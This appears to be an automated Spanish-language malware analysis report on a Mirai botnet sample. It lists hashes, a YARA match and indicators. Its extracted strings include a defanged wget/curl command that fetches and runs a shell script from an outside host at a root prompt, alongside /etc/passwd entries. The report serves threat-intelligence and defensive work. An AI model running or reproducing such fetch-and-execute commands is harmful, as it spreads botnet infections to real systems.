# 🧬 Payload Analysis

`21cc2903920c7ee446963e4e3c693cb39930e71028fe8a7da726168dca4ffc6f`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se registró 1 detección YARA válida. Se asociaron 14 comandos observados o extraídos.

## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Alta`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:30:44+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `21cc2903920c7ee446963e4e3c693cb39930e71028fe8a7da726168dca4ffc6f`
- **MD5:** `9941f5b14af8f95faf39d236acef4c82`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 2.1 KiB |
| Entropía | 5.39 |
| Strings | 48 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- YARA match: mirai
YARA match: mirai
YARA match: mirai
YARA match: mirai
YARA match: mirai

## 🖥️ Comandos observados / extraídos

```text
[4lcurl: option -k not recognized
[4lroot@db12-web01:~# (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh)
[4lwget: invalid option -- 'no-check-certificate'
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
curl: try 'curl --help' or 'curl --manual' for more information
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
Try `wget --help' for more options.
Usage: wget [OPTION]... [URL]...
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 217.60.195.XXX | static_analysis |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| hash | 21cc2903920c7ee446963e4e3c693cb39930e71028fe8a7da726168dca4ffc6f | static_analysis |
| command | [4lcurl: option -k not recognized | strings |
| command | [4lroot@db12-web01:~# (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) | strings |
| command | [4lwget: invalid option -- 'no-check-certificate' | strings |
| command | backup:x:34:34:backup:/var/backups:/usr/sbin/nologin | strings |
| command | curl: try 'curl --help' or 'curl --manual' for more information | strings |
| command | list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin | strings |
| command | lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin | strings |
| command | mail:x:8:8:mail:/var/mail:/usr/sbin/nologin | strings |
| command | man:x:6:12:man:/var/cache/man:/usr/sbin/nologin | strings |
| command | news:x:9:9:news:/var/spool/news:/usr/sbin/nologin | strings |
| command | Try `wget --help' for more options. | strings |
| command | Usage: wget [OPTION]... [URL]... | strings |
| command | uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin | strings |
| command | www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin | strings |
| ip | [internal-ip-redacted] | artifact_source |

## 🧬 Detecciones YARA

| Regla | Familia | Severidad | Confianza |
| --- | --- | --- | --- |
| Suspicious_BusyBox_Mirai |  | medium | medium |

Detalle completo: [`detections.md`](detections.md).

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
